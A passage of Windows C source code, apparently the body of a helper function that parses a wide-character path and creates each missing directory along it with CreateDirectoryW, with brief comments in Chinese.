	WCHAR*pTempDir = (WCHAR*)malloc((wcslen(Path) + 1)*sizeof(WCHAR));
	wcscpy(pTempDir, Path);
	BOOL bResult = FALSE;
	WCHAR* pIt = NULL;
	//找到文件名.;
	if (bIncludeFileName)
	{
		pIt = pTempDir + wcslen(pTempDir) - 1;
		while (pIt[0] != '\\' && pIt[0] != '/' && pIt > pTempDir) pIt--;
		if (pIt[0] != '/' && pIt[0] != '\\')
			goto Return;
		//'/' ---> 0
		pIt[0] = 0;
	}
	//找到':';
	if ((pIt = wcsstr(pTempDir, L":")) == NULL || (pIt[1] != '\\' && pIt[1] != '/'))
		goto Return;
	pIt++;

	while (pIt[0])
	{
		WCHAR oldCh;
		//跳过'/'或'\\';
		while (pIt[0] && (pIt[0] == '\\' || pIt[0] == '/'))
			pIt++;
		//找到结尾.;
		while (pIt[0] && (pIt[0] != '\\' && pIt[0] != '/'))
			pIt++;
		//
		oldCh = pIt[0];
		pIt[0] = 0;

		if (!CreateDirectoryW(pTempDir, NULL) && GetLastError()!=ERROR_ALREADY_EXISTS)
			goto Return;

		pIt[0] = oldCh;
	}
	bResult = TRUE;
Return:
	free(pTempDir);
	return bResult;
}
